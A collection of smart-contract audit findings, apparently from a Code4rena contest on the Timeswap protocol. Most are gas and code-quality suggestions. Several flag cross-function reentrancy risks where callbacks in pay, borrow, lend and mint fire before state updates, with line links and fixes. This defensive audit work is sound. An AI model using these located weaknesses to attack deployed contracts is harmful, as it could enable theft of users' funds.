# Handle  Dravee   # Vulnerability details  ## Impact Removing unused named return variables can reduce gas usage and improve code clarity.  ## Proof of Concept In `TimeswapPair:constantProduct()`, you return using both named return and actual return statement. To save gas and improve code quality consider using only one of those.  ```     /// @inheritdoc IPair     function constantProduct(uint256 maturity)         external         view         override         returns (             uint112 x,             uint112 y,             uint112 z         )     {         State memory state = pools[maturity].state;         return (state.x, state.y, state.z);     } ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Remove the unused named returns  
# Handle  Dravee   # Vulnerability details  ## Impact Some of the require statements can be placed earlier to reduce gas usage on revert. As a reminder from the [Ethereum Yellow Paper](https://ethereum.github.io/yellowpaper/paper.pdf), Appendix G and Appendix H: - TIMESTAMP costs 2 gas - ADDRESS costs 2 gas - MLOAD costs 3 gas  ## Proof of Concept The following can be reorder to save gas on revert:  ```         require(block.timestamp < maturity, 'E202');          require(ids.length == assetsIn.length && ids.length == collateralsOut.length, 'E205');         require(to != address(0), 'E201');         require(to != address(this), 'E204'); ``` to ```         require(block.timestamp < maturity, 'E202');         require(to != address(0), 'E201');         require(to != address(this), 'E204');         require(ids.length == assetsIn.length && ids.length == collateralsOut.length, 'E205'); ```  ## Tools Used VS Code  ## Recommended Mitigation Steps Relocate the said require statements  
# Handle  Dravee   # Vulnerability details  ## Impact   Due to how `constant` variables are implemented, an expression assigned to a `constant` variable is recomputed each time that the variable is used, which wastes some gas.      If the variable was `immutable` instead: the calculation would only be done once at deploy time (in the constructor), and then the result would be saved and read directly at runtime rather than being recalculated.    See: [ethereum/solidity#9232]([https://github.com/ethereum/solidity/issues/9232](https://github.com/ethereum/solidity/issues/9232))      ## Proof of Concept   ```   Timeswap-V1-Convenience\contracts\libraries\DateTime.sol:31:    uint constant SECONDS_PER_DAY = 24 * 60 * 60; Timeswap-V1-Convenience\contracts\libraries\DateTime.sol:32:    uint constant SECONDS_PER_HOUR = 60 * 60; ```      ## Tools Used   VS Code      ## Recommended Mitigation Steps   Change these expressions from `constant` to `immutable` and implement the calculation in the constructor   
# Handle  hyh   # Vulnerability details  ## Impact  There can be issues with troubleshooting and system usage analytics.  ## Proof of Concept  E512 error code is meant for 'Debt is greater than max Debt' situation:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/ErrorCodes.md#e512   In Mint library E512 is used for collateral max value check:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L482   Also, code E513, that is to be used for collateral check above, is also used for max asset increase check, which doesnt seem to have an error code of its own:  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L481  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/libraries/Mint.sol#L643   ## Recommended Mitigation Steps  Change Mint line 482 error code to be 513: https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/ErrorCodes.md#e513  Possibly add an error code for max asset check for Mint lines 481 and 643.  
# Handle  0x1f8b   # Vulnerability details  ## Impact Gas saving.  ## Proof of Concept Moving the substraction inside the if condition in `TimeswapPair.withdraw` could be avoided the zero substraction.  ## Tools Used Manual review.  ## Recommended Mitigation Steps Change: ``` pool.state.reserves.asset -= tokensOut.asset;         pool.state.reserves.collateral -= tokensOut.collateral;          if (tokensOut.asset > 0) asset.safeTransfer(assetTo, tokensOut.asset);         if (tokensOut.collateral > 0) collateral.safeTransfer(collateralTo, tokensOut.collateral);. ``` to ```         if (tokensOut.asset > 0) { pool.state.reserves.asset -= tokensOut.asset; asset.safeTransfer(assetTo, tokensOut.asset); }         if (tokensOut.collateral > 0) { pool.state.reserves.collateral -= tokensOut.collateral; collateral.safeTransfer(collateralTo, tokensOut.collateral);. } ```  
# Handle  Jujic   # Vulnerability details  ## Impact Here you could use unchecked{++i} to save gas since it is more efficient then i++.  ``` for (uint256 i; i < ids.length; i++) {  ```  ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/bf50d2a8bb93a5571f35f96bd74af54d9c92a210/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L359  ## Tools Used Remix  ## Recommended Mitigation Steps  
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapConvenience.sol the constructor takes in 2 addresses for _factory and _weth and sets them in storage without checking that they are unique which can introduce possible costly errors during deployment.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L62  ## Tools Used Manuel code review   ## Recommended Mitigation Steps Add to TimeswapConvenience.sol constructor:   require(_factory != _weth, "Duplicate address")  
# Handle  jayjonah8   # Vulnerability details  ## Impact In CollateralizedDebt.sol, the mint() function calls _safeMint() which has a callback to the "to" address argument.  Functions with callbacks should have reentrancy guards in place for protection against possible malicious actors both from inside and outside the protocol.    ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/CollateralizedDebt.sol#L76  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L263  https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol#L395  ## Tools Used Manual code review   ## Recommended Mitigation Steps Add a reentrancy guard modifier on the mint() function in CollateralizedDebt.sol   
# Handle  danb   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/MintMath.sol#L65  ``` y <= x ``` can be removed  
# Handle  danb   # Vulnerability details  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Convenience/contracts/TimeswapConvenience.sol#L69  the contract should receive ether only from weth,  consider adding:  ``` require(msg.sender == weth); ```  
# Handle  robee   # Vulnerability details  The function dueOf in CollateralizedDebt.sol could be set external   
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol the pay() function calls safeTransfer() and does so using the SafeTransfer.sol library when it can simply add the open zeppelin SafeERC20.sol import directly inside TimeswapPair.sol itself eliminating the unnecessary code in the protocols own SafeTransfer library.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L374  https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/libraries/SafeTransfer.sol#L7  ## Tools Used Manual code review   ## Recommended Mitigation Steps Use the open zeppelin SafeERC20 import directly inside the TimeswapPair.sol file instead of calling your own library.  The extra safeTransfer library can then be deleted.   
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the pay() function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserves collateral and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L369  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback "if (assetIn > 0) Callback.pay(asset, assetIn, data);"  should be placed at the end of the pay() function after all state updates have taken place.   
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the borrow() function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to collateral, totalDebtCreated and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L322  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback Callback.borrow(collateral, dueOut.collateral, data); should be placed at the end of the borrow() function after all state updates have taken place.   
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the lend() function has a callback to the msg.sender in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to totalClaims bonds,  insurance and reserves assets) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L246  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback Callback.lend(asset, xIncrease, data); should be placed at the end of the lend() function after all state updates have taken place.   
# Handle  jayjonah8   # Vulnerability details  ## Impact In TimeswapPair.sol, the mint() function has a callback in the middle of the function while there are still updates to state that take place after the callback.  The lock modifier guards against reentrancy but not against cross function reentrancy.  Since the protocol implements Uniswap like functionality,  this can be extremely dangerous especially with regard to composability/interacting with other protocols and contracts.  The callback before important state changes (updates to reserve asset, collateral, and totalDebtCreated) also violates the Checks Effects Interactions best practices further widening the attack surface.   ## Proof of Concept https://github.com/code-423n4/2022-01-timeswap/blob/main/Timeswap/Timeswap-V1-Core/contracts/TimeswapPair.sol#L177  https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html  cross function reentrancy https://medium.com/coinmonks/protect-your-solidity-smart-contracts-from-reentrancy-attacks-9972c3af7c21  ## Tools Used Manual code review   ## Recommended Mitigation Steps The callback Callback.mint(asset, collateral, xIncrease, dueOut.collateral, data) should be placed at the end of the mint() function after all state updates have taken place.   
